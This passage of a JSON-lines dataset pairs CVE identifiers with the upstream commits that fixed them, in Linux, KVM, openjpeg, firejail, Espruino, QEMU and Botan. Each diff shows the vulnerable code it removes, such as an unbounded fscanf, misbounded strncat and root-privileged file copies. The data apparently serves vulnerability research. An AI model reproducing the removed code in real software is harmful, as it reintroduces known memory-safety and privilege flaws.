a/arch/sh/mm/mmap.c\n+++ b/arch/sh/mm/mmap.c\n@@ -54,7 +54,8 @@ unsigned long arch_get_unmapped_area(struct file *filp, unsigned long addr,\n \t\t/* We do not accept a shared mapping if it would violate\n \t\t * cache aliasing constraints.\n \t\t */\n-\t\tif ((flags & MAP_SHARED) && (addr & shm_align_mask))\n+\t\tif ((flags & MAP_SHARED) &&\n+\t\t    ((addr - (pgoff << PAGE_SHIFT)) & shm_align_mask))\n \t\t\treturn -EINVAL;\n \t\treturn addr;\n \t}\ndiff --git a/arch/sparc/kernel/sys_sparc_32.c b/arch/sparc/kernel/sys_sparc_32.c\nindex 997bdd0d3d70..3a82e65d8db2 100644\n--- a/arch/sparc/kernel/sys_sparc_32.c\n+++ b/arch/sparc/kernel/sys_sparc_32.c\n@@ -45,7 +45,8 @@ unsigned long arch_get_unmapped_area(struct file *filp, unsigned long addr, unsi\n \t\t/* We do not accept a shared mapping if it would violate\n \t\t * cache aliasing constraints.\n \t\t */\n-\t\tif ((flags & MAP_SHARED) && (addr & (SHMLBA - 1)))\n+\t\tif ((flags & MAP_SHARED) &&\n+\t\t    ((addr - (pgoff << PAGE_SHIFT)) & (SHMLBA - 1)))\n \t\t\treturn -EINVAL;\n \t\treturn addr;\n \t}\n-- \ncgit 1.2-0.3.lf.el7\n\n", "owner": "mjg59", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2014-3610", "CWE_ID": "264", "category": "security", "commit_id": "854e8bb1aa06c578c2c9145fa6bfe3680ef63b23", "commit_message": "From 854e8bb1aa06c578c2c9145fa6bfe3680ef63b23 Mon Sep 17 00:00:00 2001\nFrom: Nadav Amit <namit@cs.technion.ac.il>\nDate: Tue, 16 Sep 2014 03:24:05 +0300\nSubject: [PATCH] KVM: x86: Check non-canonical addresses upon WRMSR\n\nUpon WRMSR, the CPU should inject #GP if a non-canonical value (address) is\nwritten to certain MSRs. The behavior is \"almost\" identical for AMD and Intel\n(ignoring MSRs that are not implemented in either architecture since they would\nanyhow #GP). However, IA32_SYSENTER_ESP and IA32_SYSENTER_EIP cause #GP if\nnon-canonical address is written on Intel but not on AMD (which ignores the top\n32-bits).\n\nAccordingly, this patch injects a #GP on the MSRs which behave identically on\nIntel and AMD.  To eliminate the differences between the architecutres, the\nvalue which is written to IA32_SYSENTER_ESP and IA32_SYSENTER_EIP is turned to\ncanonical value before writing instead of injecting a #GP.\n\nSome references from Intel and AMD manuals:\n\nAccording to Intel SDM description of WRMSR instruction #GP is expected on\nWRMSR \"If the source register contains a non-canonical address and ECX\nspecifies one of the following MSRs: IA32_DS_AREA, IA32_FS_BASE, IA32_GS_BASE,\nIA32_KERNEL_GS_BASE, IA32_LSTAR, IA32_SYSENTER_EIP, IA32_SYSENTER_ESP.\"\n\nAccording to AMD manual instruction manual:\nLSTAR/CSTAR (SYSCALL): \"The WRMSR instruction loads the target RIP into the\nLSTAR and CSTAR registers.  If an RIP written by WRMSR is not in canonical\nform, a general-protection exception (#GP) occurs.\"\nIA32_GS_BASE and IA32_FS_BASE (WRFSBASE/WRGSBASE): \"The address written to the\nbase field must be in canonical form or a #GP fault will occur.\"\nIA32_KERNEL_GS_BASE (SWAPGS): \"The address stored in the KernelGSbase MSR must\nbe in canonical form.\"\n\nThis patch fixes CVE-2014-3610.\n\nCc: stable@vger.kernel.org\nSigned-off-by: Nadav Amit <namit@cs.technion.ac.il>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>\n---\n arch/x86/include/asm/kvm_host.h | 14 ++++++++++++++\n arch/x86/kvm/svm.c              |  2 +-\n arch/x86/kvm/vmx.c              |  2 +-\n arch/x86/kvm/x86.c              | 27 ++++++++++++++++++++++++++-\n 4 files changed, 42 insertions(+), 3 deletions(-)\n\n", "diff_code": "diff --git a/arch/x86/include/asm/kvm_host.h b/arch/x86/include/asm/kvm_host.h\nindex 7d603a71ab3a9..ccc94de4ac499 100644\n--- a/arch/x86/include/asm/kvm_host.h\n+++ b/arch/x86/include/asm/kvm_host.h\n@@ -989,6 +989,20 @@ static inline void kvm_inject_gp(struct kvm_vcpu *vcpu, u32 error_code)\n \tkvm_queue_exception_e(vcpu, GP_VECTOR, error_code);\n }\n \n+static inline u64 get_canonical(u64 la)\n+{\n+\treturn ((int64_t)la << 16) >> 16;\n+}\n+\n+static inline bool is_noncanonical_address(u64 la)\n+{\n+#ifdef CONFIG_X86_64\n+\treturn get_canonical(la) != la;\n+#else\n+\treturn false;\n+#endif\n+}\n+\n #define TSS_IOPB_BASE_OFFSET 0x66\n #define TSS_BASE_SIZE 0x68\n #define TSS_IOPB_SIZE (65536 / 8)\ndiff --git a/arch/x86/kvm/svm.c b/arch/x86/kvm/svm.c\nindex 65510f624dfe2..00bed2c5e948a 100644\n--- a/arch/x86/kvm/svm.c\n+++ b/arch/x86/kvm/svm.c\n@@ -3251,7 +3251,7 @@ static int wrmsr_interception(struct vcpu_svm *svm)\n \tmsr.host_initiated = false;\n \n \tsvm->next_rip = kvm_rip_read(&svm->vcpu) + 2;\n-\tif (svm_set_msr(&svm->vcpu, &msr)) {\n+\tif (kvm_set_msr(&svm->vcpu, &msr)) {\n \t\ttrace_kvm_msr_write_ex(ecx, data);\n \t\tkvm_inject_gp(&svm->vcpu, 0);\n \t} else {\ndiff --git a/arch/x86/kvm/vmx.c b/arch/x86/kvm/vmx.c\nindex 0acac81f198b0..148020a7dd980 100644\n--- a/arch/x86/kvm/vmx.c\n+++ b/arch/x86/kvm/vmx.c\n@@ -5291,7 +5291,7 @@ static int handle_wrmsr(struct kvm_vcpu *vcpu)\n \tmsr.data = data;\n \tmsr.index = ecx;\n \tmsr.host_initiated = false;\n-\tif (vmx_set_msr(vcpu, &msr) != 0) {\n+\tif (kvm_set_msr(vcpu, &msr) != 0) {\n \t\ttrace_kvm_msr_write_ex(ecx, data);\n \t\tkvm_inject_gp(vcpu, 0);\n \t\treturn 1;\ndiff --git a/arch/x86/kvm/x86.c b/arch/x86/kvm/x86.c\nindex 34c8f94331f83..5a7195573a327 100644\n--- a/arch/x86/kvm/x86.c\n+++ b/arch/x86/kvm/x86.c\n@@ -987,7 +987,6 @@ void kvm_enable_efer_bits(u64 mask)\n }\n EXPORT_SYMBOL_GPL(kvm_enable_efer_bits);\n \n-\n /*\n  * Writes msr value into into the appropriate \"register\".\n  * Returns 0 on success, non-0 otherwise.\n@@ -995,8 +994,34 @@ EXPORT_SYMBOL_GPL(kvm_enable_efer_bits);\n  */\n int kvm_set_msr(struct kvm_vcpu *vcpu, struct msr_data *msr)\n {\n+\tswitch (msr->index) {\n+\tcase MSR_FS_BASE:\n+\tcase MSR_GS_BASE:\n+\tcase MSR_KERNEL_GS_BASE:\n+\tcase MSR_CSTAR:\n+\tcase MSR_LSTAR:\n+\t\tif (is_noncanonical_address(msr->data))\n+\t\t\treturn 1;\n+\t\tbreak;\n+\tcase MSR_IA32_SYSENTER_EIP:\n+\tcase MSR_IA32_SYSENTER_ESP:\n+\t\t/*\n+\t\t * IA32_SYSENTER_ESP and IA32_SYSENTER_EIP cause #GP if\n+\t\t * non-canonical address is written on Intel but not on\n+\t\t * AMD (which ignores the top 32-bits, because it does\n+\t\t * not implement 64-bit SYSENTER).\n+\t\t *\n+\t\t * 64-bit code should hence be able to write a non-canonical\n+\t\t * value on AMD.  Making the address canonical ensures that\n+\t\t * vmentry does not fail on Intel after writing a non-canonical\n+\t\t * value, and that something deterministic happens if the guest\n+\t\t * invokes 64-bit SYSENTER.\n+\t\t */\n+\t\tmsr->data = get_canonical(msr->data);\n+\t}\n \treturn kvm_x86_ops->set_msr(vcpu, msr);\n }\n+EXPORT_SYMBOL_GPL(kvm_set_msr);\n \n /*\n  * Adapt set_msr() to msr_io()'s calling convention\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2017-14041", "CWE_ID": "787", "category": "security", "commit_id": "e5285319229a5d77bf316bb0d3a6cbd3cb8666d9", "commit_message": "From e5285319229a5d77bf316bb0d3a6cbd3cb8666d9 Mon Sep 17 00:00:00 2001\nFrom: Even Rouault <even.rouault@spatialys.com>\nDate: Fri, 18 Aug 2017 13:39:20 +0200\nSubject: [PATCH] pgxtoimage(): fix write stack buffer overflow (#997)\n\n---\n src/bin/jp2/convert.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n", "diff_code": "diff --git a/src/bin/jp2/convert.c b/src/bin/jp2/convert.c\nindex 5459f7d44..e606c9be7 100644\n--- a/src/bin/jp2/convert.c\n+++ b/src/bin/jp2/convert.c\n@@ -1185,7 +1185,7 @@ opj_image_t* pgxtoimage(const char *filename, opj_cparameters_t *parameters)\n     }\n \n     fseek(f, 0, SEEK_SET);\n-    if (fscanf(f, \"PG%[ \\t]%c%c%[ \\t+-]%d%[ \\t]%d%[ \\t]%d\", temp, &endian1,\n+    if (fscanf(f, \"PG%31[ \\t]%c%c%31[ \\t+-]%d%31[ \\t]%d%31[ \\t]%d\", temp, &endian1,\n                &endian2, signtmp, &prec, temp, &w, temp, &h) != 9) {\n         fclose(f);\n         fprintf(stderr,\n", "owner": "uclouvain", "repo": "openjpeg", "source": "cve"}
{"CVE_ID": "CVE-2017-5940", "CWE_ID": "284", "category": "security", "commit_id": "b8a4ff9775318ca5e679183884a6a63f3da8f863", "commit_message": "From b8a4ff9775318ca5e679183884a6a63f3da8f863 Mon Sep 17 00:00:00 2001\nFrom: netblue30 <netblue30@yahoo.com>\nDate: Mon, 9 Jan 2017 17:11:06 -0500\nSubject: [PATCH] replace copy_file with copy_file_as_user\n\n---\n src/firejail/firejail.h |   2 +\n src/firejail/fs_home.c  | 118 +++++++---------------------------------\n src/firejail/util.c     |  40 ++++++++++++++\n 3 files changed, 62 insertions(+), 98 deletions(-)\n\n", "diff_code": "diff --git a/src/firejail/firejail.h b/src/firejail/firejail.h\nindex 2897ffe3c..39cbe6d07 100644\n--- a/src/firejail/firejail.h\n+++ b/src/firejail/firejail.h\n@@ -446,6 +446,8 @@ void logmsg(const char *msg);\n void logargs(int argc, char **argv) ;\n void logerr(const char *msg);\n int copy_file(const char *srcname, const char *destname, uid_t uid, gid_t gid, mode_t mode);\n+void copy_file_as_user(const char *srcname, const char *destname, uid_t uid, gid_t gid, mode_t mode);\n+void touch_file_as_user(const char *fname, uid_t uid, gid_t gid, mode_t mode);\n int is_dir(const char *fname);\n int is_link(const char *fname);\n char *line_remove_spaces(const char *buf);\ndiff --git a/src/firejail/fs_home.c b/src/firejail/fs_home.c\nindex 91f77fb45..d8ff636a9 100644\n--- a/src/firejail/fs_home.c\n+++ b/src/firejail/fs_home.c\n@@ -43,18 +43,12 @@ static void skel(const char *homedir, uid_t u, gid_t g) {\n \t\tif (stat(fname, &s) == 0)\n \t\t\treturn;\n \t\tif (stat(\"/etc/skel/.zshrc\", &s) == 0) {\n-\t\t\tif (copy_file(\"/etc/skel/.zshrc\", fname, u, g, 0644) == 0) {\n-\t\t\t\tfs_logger(\"clone /etc/skel/.zshrc\");\n-\t\t\t}\n+\t\t\tcopy_file(\"/etc/skel/.zshrc\", fname, u, g, 0644);\n+\t\t\tfs_logger(\"clone /etc/skel/.zshrc\");\n \t\t}\n-\t\telse { // \n-\t\t\tFILE *fp = fopen(fname, \"w\");\n-\t\t\tif (fp) {\n-\t\t\t\tfprintf(fp, \"\\n\");\n-\t\t\t\tSET_PERMS_STREAM(fp, u, g, S_IRUSR | S_IWUSR);\n-\t\t\t\tfclose(fp);\n-\t\t\t\tfs_logger2(\"touch\", fname);\n-\t\t\t}\n+\t\telse {\n+\t\t\ttouch_file_as_user(fname, u, g, 0644);\n+\t\t\tfs_logger2(\"touch\", fname);\n \t\t}\n \t\tfree(fname);\n \t}\n@@ -68,19 +62,12 @@ static void skel(const char *homedir, uid_t u, gid_t g) {\n \t\tif (stat(fname, &s) == 0)\n \t\t\treturn;\n \t\tif (stat(\"/etc/skel/.cshrc\", &s) == 0) {\n-\t\t\tif (copy_file(\"/etc/skel/.cshrc\", fname, u, g, 0644) == 0) {\n-\t\t\t\tfs_logger(\"clone /etc/skel/.cshrc\");\n-\t\t\t}\n+\t\t\tcopy_file(\"/etc/skel/.cshrc\", fname, u, g, 0644);\n+\t\t\tfs_logger(\"clone /etc/skel/.cshrc\");\n \t\t}\n-\t\telse { // \n-\t\t\t/* coverity[toctou] */\n-\t\t\tFILE *fp = fopen(fname, \"w\");\n-\t\t\tif (fp) {\n-\t\t\t\tfprintf(fp, \"\\n\");\n-\t\t\t\tSET_PERMS_STREAM(fp, u, g, S_IRUSR | S_IWUSR);\n-\t\t\t\tfclose(fp);\n-\t\t\t\tfs_logger2(\"touch\", fname);\n-\t\t\t}\n+\t\telse {\n+\t\t\ttouch_file_as_user(fname, u, g, 0644);\n+\t\t\tfs_logger2(\"touch\", fname);\n \t\t}\n \t\tfree(fname);\n \t}\n@@ -94,9 +81,8 @@ static void skel(const char *homedir, uid_t u, gid_t g) {\n \t\tif (stat(fname, &s) == 0) \n \t\t\treturn;\n \t\tif (stat(\"/etc/skel/.bashrc\", &s) == 0) {\n-\t\t\tif (copy_file(\"/etc/skel/.bashrc\", fname, u, g, 0644) == 0) {\n-\t\t\t\tfs_logger(\"clone /etc/skel/.bashrc\");\n-\t\t\t}\n+\t\t\tcopy_file(\"/etc/skel/.bashrc\", fname, u, g, 0644);\n+\t\t\tfs_logger(\"clone /etc/skel/.bashrc\");\n \t\t}\n \t\tfree(fname);\n \t}\n@@ -126,24 +112,8 @@ static int store_xauthority(void) {\n \t\t\treturn 0;\n \t\t}\n \n-\t\tpid_t child = fork();\n-\t\tif (child < 0)\n-\t\t\terrExit(\"fork\");\n-\t\tif (child == 0) {\n-\t\t\t// drop privileges\n-\t\t\tdrop_privs(0);\n-\t\n-\t\t\t// copy, set permissions and ownership\n-\t\t\tint rv = copy_file(src, dest, getuid(), getgid(), 0600);\n-\t\t\tif (rv)\n-\t\t\t\tfprintf(stderr, \"Warning: cannot transfer .Xauthority in private home directory\\n\");\n-\t\t\telse {\n-\t\t\t\tfs_logger2(\"clone\", dest);\n-\t\t\t}\n-\t\t\t_exit(0);\n-\t\t}\n-\t\t// wait for the child to finish\n-\t\twaitpid(child, NULL, 0);\n+\t\tcopy_file_as_user(src, dest, getuid(), getgid(), 0600);\n+\t\tfs_logger2(\"clone\", dest);\n \t\treturn 1; // file copied\n \t}\n \t\n@@ -184,24 +154,8 @@ static int store_asoundrc(void) {\n \t\t\tfree(rp);\n \t\t}\n \n-\t\tpid_t child = fork();\n-\t\tif (child < 0)\n-\t\t\terrExit(\"fork\");\n-\t\tif (child == 0) {\n-\t\t\t// drop privileges\n-\t\t\tdrop_privs(0);\n-\t\n-\t\t\t// copy, set permissions and ownership\n-\t\t\tint rv = copy_file(src, dest, getuid(), getgid(), 0644);\n-\t\t\tif (rv)\n-\t\t\t\tfprintf(stderr, \"Warning: cannot transfer .asoundrc in private home directory\\n\");\n-\t\t\telse {\n-\t\t\t\tfs_logger2(\"clone\", dest);\n-\t\t\t}\n-\t\t\t_exit(0);\n-\t\t}\n-\t\t// wait for the child to finish\n-\t\twaitpid(child, NULL, 0);\n+\t\tcopy_file_as_user(src, dest, getuid(), getgid(), 0644);\n+\t\tfs_logger2(\"clone\", dest);\n \t\treturn 1; // file copied\n \t}\n \t\n@@ -221,24 +175,8 @@ static void copy_xauthority(void) {\n \t\texit(1);\n \t}\n \n-\tpid_t child = fork();\n-\tif (child < 0)\n-\t\terrExit(\"fork\");\n-\tif (child == 0) {\n-\t\t// drop privileges\n-\t\tdrop_privs(0);\n-\n-\t\t// copy, set permissions and ownership\n-\t\tint rv = copy_file(src, dest, getuid(), getgid(), S_IRUSR | S_IWUSR);\n-\t\tif (rv)\n-\t\t\tfprintf(stderr, \"Warning: cannot transfer .Xauthority in private home directory\\n\");\n-\t\telse {\n-\t\t\tfs_logger2(\"clone\", dest);\n-\t\t}\n-\t\t_exit(0);\n-\t}\n-\t// wait for the child to finish\n-\twaitpid(child, NULL, 0);\n+\tcopy_file_as_user(src, dest, getuid(), getgid(), S_IRUSR | S_IWUSR);\n+\tfs_logger2(\"clone\", dest);\n \t\n \t// delete the temporary file\n \tunlink(src);\n@@ -257,24 +195,8 @@ static void copy_asoundrc(void) {\n \t\texit(1);\n \t}\n \n-\tpid_t child = fork();\n-\tif (child < 0)\n-\t\terrExit(\"fork\");\n-\tif (child == 0) {\n-\t\t// drop privileges\n-\t\tdrop_privs(0);\n-\n-\t\t// copy, set permissions and ownership\n-\t\tint rv = copy_file(src, dest, getuid(), getgid(), S_IRUSR | S_IWUSR);\n-\t\tif (rv)\n-\t\t\tfprintf(stderr, \"Warning: cannot transfer .asoundrc in private home directory\\n\");\n-\t\telse {\n-\t\t\tfs_logger2(\"clone\", dest);\n-\t\t}\n-\t\t_exit(0);\n-\t}\n-\t// wait for the child to finish\n-\twaitpid(child, NULL, 0);\n+\tcopy_file_as_user(src, dest, getuid(), getgid(), S_IRUSR | S_IWUSR);\n+\tfs_logger2(\"clone\", dest);\n \n \t// delete the temporary file\n \tunlink(src);\ndiff --git a/src/firejail/util.c b/src/firejail/util.c\nindex f86d6c363..4ef4b2d3e 100644\n--- a/src/firejail/util.c\n+++ b/src/firejail/util.c\n@@ -28,6 +28,7 @@\n #include <grp.h>\n #include <sys/ioctl.h>\n #include <termios.h>\n+#include <sys/wait.h>\n \n #define MAX_GROUPS 1024\n // drop privileges\n@@ -219,6 +220,45 @@ int copy_file(const char *srcname, const char *destname, uid_t uid, gid_t gid, m\n \treturn 0;\n }\n \n+// return -1 if error, 0 if no error\n+void copy_file_as_user(const char *srcname, const char *destname, uid_t uid, gid_t gid, mode_t mode) {\n+\tpid_t child = fork();\n+\tif (child < 0)\n+\t\terrExit(\"fork\");\n+\tif (child == 0) {\n+\t\t// drop privileges\n+\t\tdrop_privs(0);\n+\n+\t\t// copy, set permissions and ownership\n+\t\tint rv = copy_file(srcname, destname, uid, gid, mode);\n+\t\tif (rv)\n+\t\t\tfprintf(stderr, \"Warning: cannot transfer .Xauthority in private home directory\\n\");\n+\t\t_exit(0);\n+\t}\n+\t// wait for the child to finish\n+\twaitpid(child, NULL, 0);\n+}\n+\n+// return -1 if error, 0 if no error\n+void touch_file_as_user(const char *fname, uid_t uid, gid_t gid, mode_t mode) {\n+\tpid_t child = fork();\n+\tif (child < 0)\n+\t\terrExit(\"fork\");\n+\tif (child == 0) {\n+\t\t// drop privileges\n+\t\tdrop_privs(0);\n+\n+\t\tFILE *fp = fopen(fname, \"w\");\n+\t\tif (fp) {\n+\t\t\tfprintf(fp, \"\\n\");\n+\t\t\tSET_PERMS_STREAM(fp, uid, gid, mode);\n+\t\t\tfclose(fp);\n+\t\t}\n+\t\t_exit(0);\n+\t}\n+\t// wait for the child to finish\n+\twaitpid(child, NULL, 0);\n+}\n \n // return 1 if the file is a directory\n int is_dir(const char *fname) {\n", "owner": "netblue30", "repo": "firejail", "source": "cve"}
{"CVE_ID": "CVE-2018-11595", "CWE_ID": "119", "category": "security", "commit_id": "0a7619875bf79877907205f6bee08465b89ff10b", "commit_message": "From 0a7619875bf79877907205f6bee08465b89ff10b Mon Sep 17 00:00:00 2001\nFrom: Gordon Williams <gw@pur3.co.uk>\nDate: Mon, 21 May 2018 10:35:49 +0100\nSubject: [PATCH] Fix strncat/cpy bounding issues (fix #1425)\n\n---\n ChangeLog     |  1 +\n src/jslex.c   | 11 +++--------\n src/jspin.c   |  8 ++++----\n src/jsutils.c |  7 ++++---\n src/jsvar.c   |  3 ++-\n 5 files changed, 14 insertions(+), 16 deletions(-)\n\n", "diff_code": "diff --git a/ChangeLog b/ChangeLog\nindex a857a1621..b09d6f6a0 100644\n--- a/ChangeLog\n+++ b/ChangeLog\n@@ -2,6 +2,7 @@\n             nRF5x: Make FlashWrite cope with flash writes > 4k\n             Increase max size of native strings on platforms that support it - 16 bit to 32 bit (#1432)\n             Fix stack size detection on Linux (fix #1427)\n+            Fix strncat/cpy bounding issues (fix #1425)\n \n      1v98 : Allow Crypto SHA1 without SHA256/512 (for ESP8266 where flash is scarce)\n             Add better docs for the form of Wifi callback functions\ndiff --git a/src/jslex.c b/src/jslex.c\nindex b6d02738c..190209c51 100644\n--- a/src/jslex.c\n+++ b/src/jslex.c\n@@ -814,19 +814,14 @@ void jslTokenAsString(int token, char *str, size_t len) {\n   }\n \n   assert(len>=10);\n-  strncpy(str, \"?[\",len);\n-  itostr(token, &str[2], 10);\n-  strncat(str, \"]\",len);\n+  espruino_snprintf(str, len, \"?[%d]\", token);\n }\n \n void jslGetTokenString(char *str, size_t len) {\n   if (lex->tk == LEX_ID) {\n-    strncpy(str, \"ID:\", len);\n-    strncat(str, jslGetTokenValueAsString(), len);\n+    espruino_snprintf(str, len, \"ID:%s\", jslGetTokenValueAsString());\n   } else if (lex->tk == LEX_STR) {\n-    strncpy(str, \"String:'\", len);\n-    strncat(str, jslGetTokenValueAsString(), len);\n-    strncat(str, \"'\", len);\n+    espruino_snprintf(str, len, \"String:'%s'\", jslGetTokenValueAsString());\n   } else\n     jslTokenAsString(lex->tk, str, len);\n }\ndiff --git a/src/jspin.c b/src/jspin.c\nindex 8fdd42163..f06bd9926 100644\n--- a/src/jspin.c\n+++ b/src/jspin.c\n@@ -179,7 +179,7 @@ void jshGetPinString(char *result, Pin pin) {\n #endif\n #endif\n     } else {\n-      strncpy(result, \"undefined\", 10);\n+      strcpy(result, \"undefined\");\n     }\n   }\n \n@@ -379,10 +379,10 @@ void jshPinFunctionToString(JshPinFunction pinFunc, JshPinFunctionToStringFlags\n     jsiConsolePrintf(\"Couldn't convert pin function %d\\n\", pinFunc);\n     return;\n   }\n-  if (flags & JSPFTS_DEVICE) strncat(buf, devStr, bufSize);\n+  if (flags & JSPFTS_DEVICE) strncat(buf, devStr, bufSize-1);\n   if (flags & JSPFTS_DEVICE_NUMBER) itostr(devIdx, &buf[strlen(buf)], 10);\n-  if (flags & JSPFTS_SPACE) strncat(buf, \" \", bufSize);\n-  if (infoStr && (flags & JSPFTS_TYPE)) strncat(buf, infoStr, bufSize);\n+  if (flags & JSPFTS_SPACE) strncat(buf, \" \", bufSize-(strlen(buf)+1));\n+  if (infoStr && (flags & JSPFTS_TYPE)) strncat(buf, infoStr, bufSize-(strlen(buf)+1));\n }\n \n /** Prints a list of capable pins, eg:\ndiff --git a/src/jsutils.c b/src/jsutils.c\nindex be879cc19..6384089e2 100644\n--- a/src/jsutils.c\n+++ b/src/jsutils.c\n@@ -604,11 +604,12 @@ void itostr_extra(JsVarInt vals,char *str,bool signedVal, unsigned int base) {\n }\n \n void ftoa_bounded_extra(JsVarFloat val,char *str, size_t len, int radix, int fractionalDigits) {\n+  assert(len>9); // in case if strcpy\n   const JsVarFloat stopAtError = 0.0000001;\n-  if (isnan(val)) strncpy(str,\"NaN\",len);\n+  if (isnan(val)) strcpy(str,\"NaN\");\n   else if (!isfinite(val)) {\n-    if (val<0) strncpy(str,\"-Infinity\",len);\n-    else strncpy(str,\"Infinity\",len);\n+    if (val<0) strcpy(str,\"-Infinity\");\n+    else strcpy(str,\"Infinity\");\n   } else {\n     if (val<0) {\n       if (--len <= 0) { *str=0; return; } // bounds check\ndiff --git a/src/jsvar.c b/src/jsvar.c\nindex 4f0e050ed..c7564f176 100644\n--- a/src/jsvar.c\n+++ b/src/jsvar.c\n@@ -1186,6 +1186,7 @@ size_t jsvGetString(const JsVar *v, char *str, size_t len) {\n   const char *s = jsvGetConstString(v);\n   if (s) {\n     strncpy(str, s, len);\n+    str[len-1] = 0;\n     return strlen(s);\n   } else if (jsvIsInt(v)) {\n     itostr(v->varData.integer, str, 10);\n@@ -1218,7 +1219,7 @@ size_t jsvGetString(const JsVar *v, char *str, size_t len) {\n       jsvUnLock(stringVar);\n       return l;\n     } else {\n-      strncpy(str, \"\", len);\n+      str[0] = 0;\n       jsExceptionHere(JSET_INTERNALERROR, \"Variable type cannot be converted to string\");\n       return 0;\n     }\n", "owner": "espruino", "repo": "Espruino", "source": "cve"}
{"CVE_ID": "CVE-2015-8745", "CWE_ID": "284", "category": "security", "commit_id": "c6048f849c7e3f009786df76206e895a69de032c", "commit_message": "From c6048f849c7e3f009786df76206e895a69de032c Mon Sep 17 00:00:00 2001\nFrom: Shmulik Ladkani <shmulik.ladkani@ravellosystems.com>\nDate: Mon, 21 Sep 2015 17:09:02 +0300\nSubject: [PATCH] vmxnet3: Support reading IMR registers on bar0\n\nInstead of asserting, return the actual IMR register value.\nThis is aligned with what's returned on ESXi.\n\nSigned-off-by: Shmulik Ladkani <shmulik.ladkani@ravellosystems.com>\nTested-by: Dana Rubin <dana.rubin@ravellosystems.com>\nSigned-off-by: Jason Wang <jasowang@redhat.com>\n---\n hw/net/vmxnet3.c | 6 +++++-\n 1 file changed, 5 insertions(+), 1 deletion(-)\n\n", "diff_code": "diff --git a/hw/net/vmxnet3.c b/hw/net/vmxnet3.c\nindex 48ced71..057f0dc 100644\n--- a/hw/net/vmxnet3.c\n+++ b/hw/net/vmxnet3.c\n@@ -1163,9 +1163,13 @@ vmxnet3_io_bar0_write(void *opaque, hwaddr addr,\n static uint64_t\n vmxnet3_io_bar0_read(void *opaque, hwaddr addr, unsigned size)\n {\n+    VMXNET3State *s = opaque;\n+\n     if (VMW_IS_MULTIREG_ADDR(addr, VMXNET3_REG_IMR,\n                         VMXNET3_MAX_INTRS, VMXNET3_REG_ALIGN)) {\n-        g_assert_not_reached();\n+        int l = VMW_MULTIREG_IDX_BY_ADDR(addr, VMXNET3_REG_IMR,\n+                                         VMXNET3_REG_ALIGN);\n+        return s->interrupt_states[l].is_masked;\n     }\n \n     VMW_CBPRN(\"BAR0 unknown read [%\" PRIx64 \"], size %d\", addr, size);\n-- \n1.8.3.1\n\n", "owner": "bonzini", "repo": "qemu", "source": "cve"}
{"CVE_ID": "CVE-2016-8630", "CWE_ID": "284", "category": "security", "commit_id": "d9092f52d7e61dd1557f2db2400ddb430e85937e", "commit_message": "From d9092f52d7e61dd1557f2db2400ddb430e85937e Mon Sep 17 00:00:00 2001\nFrom: Owen Hofmann <osh@google.com>\nDate: Thu, 27 Oct 2016 11:25:52 -0700\nSubject: kvm: x86: Check memopp before dereference (CVE-2016-8630)\n\nCommit 41061cdb98 (\"KVM: emulate: do not initialize memopp\") removes a\ncheck for non-NULL under incorrect assumptions. An undefined instruction\nwith a ModR/M byte with Mod=0 and R/M-5 (e.g. 0xc7 0x15) will attempt\nto dereference a null pointer here.\n\nFixes: 41061cdb98a0bec464278b4db8e894a3121671f5\nMessage-Id: <1477592752-126650-2-git-send-email-osh@google.com>\nSigned-off-by: Owen Hofmann <osh@google.com>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>\n---\n arch/x86/kvm/emulate.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n", "diff_code": "diff --git a/arch/x86/kvm/emulate.c b/arch/x86/kvm/emulate.c\nindex 4e95d3eb2955..cbd7b92585bb 100644\n--- a/arch/x86/kvm/emulate.c\n+++ b/arch/x86/kvm/emulate.c\n@@ -5045,7 +5045,7 @@ done_prefixes:\n \t/* Decode and fetch the destination operand: register or memory. */\n \trc = decode_operand(ctxt, &ctxt->dst, (ctxt->d >> DstShift) & OpMask);\n \n-\tif (ctxt->rip_relative)\n+\tif (ctxt->rip_relative && likely(ctxt->memopp))\n \t\tctxt->memopp->addr.mem.ea = address_mask(ctxt,\n \t\t\t\t\tctxt->memopp->addr.mem.ea + ctxt->_eip);\n \n-- \ncgit 1.2-0.3.lf.el7\n\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2016-9132", "CWE_ID": "190", "category": "security", "commit_id": "06a93345fb715dfaefbdb5774ec66eff46fdfaa3", "commit_message": "From 06a93345fb715dfaefbdb5774ec66eff46fdfaa3 Mon Sep 17 00:00:00 2001\nFrom: Jack Lloyd <jack@randombit.net>\nDate: Wed, 23 Nov 2016 12:46:45 -0500\nSubject: [PATCH] Check for overflow in BER decoder EOC scanning\n\n---\n doc/security.rst         | 11 ++++++++++-\n src/lib/asn1/ber_dec.cpp |  5 ++++-\n src/lib/utils/info.txt   |  3 ++-\n src/lib/utils/safeint.h  | 39 +++++++++++++++++++++++++++++++++++++++\n 4 files changed, 55 insertions(+), 3 deletions(-)\n create mode 100644 src/lib/utils/safeint.h\n\n", "diff_code": "diff --git a/doc/security.rst b/doc/security.rst\nindex faefca7d52..151c279f64 100644\n--- a/doc/security.rst\n+++ b/doc/security.rst\n@@ -21,7 +21,16 @@ Advisories\n 2016\n ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n \n-* 2016-10-8871 (CVE-2016-8871) OAEP side channel\n+* 2016-11-27 (CVE-2016-xxxx) Integer overflow in BER decoder\n+\n+  While decoding BER length fields, an integer overflow could occur. This could\n+  occur while parsing untrusted inputs such as X.509 certificates. The overflow\n+  does not seem to lead to any obviously exploitable condition, but exploitation\n+  cannot be positively ruled out. Only 32-bit platforms are likely affected; to\n+  cause an overflow on 64-bit the parsed data would have to be many gigabytes.\n+  Bug found by Falko Strenzke, cryptosource GmbH.\n+\n+* 2016-10-26 (CVE-2016-8871) OAEP side channel\n \n   A side channel in OAEP decoding could be used to distinguish RSA ciphertexts\n   that did or did not have a leading 0 byte. For an attacker capable of\ndiff --git a/src/lib/asn1/ber_dec.cpp b/src/lib/asn1/ber_dec.cpp\nindex ac676cd087..81c04aa6ad 100644\n--- a/src/lib/asn1/ber_dec.cpp\n+++ b/src/lib/asn1/ber_dec.cpp\n@@ -9,6 +9,7 @@\n #include <botan/ber_dec.h>\n #include <botan/bigint.h>\n #include <botan/loadstor.h>\n+#include 